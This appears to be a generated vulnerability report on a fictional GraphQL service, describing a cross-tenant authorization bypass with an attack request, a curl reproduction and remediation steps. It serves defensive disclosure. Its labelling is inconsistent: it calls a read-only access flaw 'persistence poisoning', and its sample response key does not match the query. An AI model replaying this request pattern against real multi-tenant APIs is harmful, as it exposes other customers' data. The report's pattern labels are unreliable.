# Security Analysis Report
**System:** Aegis Vault Secure Repository — v5.9.6 (FINAL)
**Domain:** Defense Industrial Base
**Example ID:** GQL-0256
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Integrity — Pattern 4.2 | Persistence poisoning via lifecycle actions — `listResources` accepts caller-supplied `tenantId` enabling cross-tenant defense data access |

---

## Finding 1 — Integrity: Persistence Poisoning via Lifecycle Actions on Resource Listing (Pattern 4.2)

### Summary
The `listResources` GraphQL query on Aegis Vault Secure Repository (`api.aegis-vault-secure-r.example.com`) accepts a caller-supplied `tenantId` argument without validating it against the JWT's `tenantId`. Per §5.0 Pattern 4.2, this enables persistence poisoning via lifecycle actions: an attacker authenticated to `tenant-7fbe` can enumerate and extract resources belonging to `tenant-da10` by supplying the victim's `tenantId` as a query argument. The `getResource` resolver also lacks tenancy checks (§4.0 RISK-GQL-256). In a defense industrial base context, resource records may contain classified project artifacts, IaC state files, security configurations, and contractor PII.

**HAR artifact note:** The request uses `listResources(tenantId: "tenant-da10")` but the response JSON key is `getResource`. This inconsistency exists in context.txt §6.0 and is documented as-is.

**Pattern:** 4.2 — Persistence poisoning via lifecycle actions (Integrity)
**Affected resolver:** `listResources(tenantId: ID, status: String)`
**Affected endpoint:** `POST https://api.aegis-vault-secure-r.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.aegis-vault-secure-r.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-7fbe
Content-Type: application/json

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-da10\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Victim Defense Repository Data Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-da10",
      "ownerId": "other-user-7fbeda10",
      "data": {
        "sensitiveField": "CONFIDENTIAL-7fbeda10",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Note: `x-request-id: req-7fbeda10` is a server-assigned **response** header (§6.0 response.headers). It is not part of the attack request.

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `resourceId` only — no tenant dimension |
| §3.0 Schema | `listResources(tenantId: ID)` — `tenantId` is optional, caller-supplied |
| §4.0 RISK-GQL-256 | `getResource` resolver fetches by `resourceId` only; no tenancy check |
| §5.0 Pattern 4.2 | Persistence poisoning — attacker reads lifecycle state of another tenant's resources |
| HAR request | Attacker `tenant-7fbe` supplies `tenantId: "tenant-da10"` as query argument |
| HAR response | `CONFIDENTIAL-7fbeda10` and `internalNotes` from `tenant-da10` returned |

---

## Steps to Reproduce

```bash
# Authenticate as attacker (tenant-7fbe)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Supply victim tenantId as listResources argument
# x-request-id is server-assigned and appears in the response only; not sent in the request
curl -s -X POST https://api.aegis-vault-secure-r.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-7fbe" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listResources(tenantId: \"tenant-da10\") { resourceId ownerId data { sensitiveField } } }"}'

# Expected (vulnerable): Returns CONFIDENTIAL-7fbeda10 from tenant-da10
# Expected (secure): { "errors": [{ "message": "Forbidden" }], "data": { "listResources": null } }
```

---

## Remediation

1. **Resolver `tenantId` enforcement:** In `listResources`, ignore the caller-supplied `tenantId` argument entirely — derive tenant from `$jwt.tenantId` only: `WHERE tenant_id = $jwtTenantId`.
2. **`getResource` check (§4.0 RISK-GQL-256):** `WHERE resource_id = $id AND tenant_id = $jwtTenantId`.
3. **Cache keying:** Include `tenantId` in Redis key: `resource:{tenantId}:{resourceId}`.
4. **Defense Industrial Base note:** Resource records in Aegis Vault may represent IaC state artifacts, security configurations, and classified project data. Cross-tenant access constitutes a potential ITAR / EAR violation and must be treated as a national security incident.
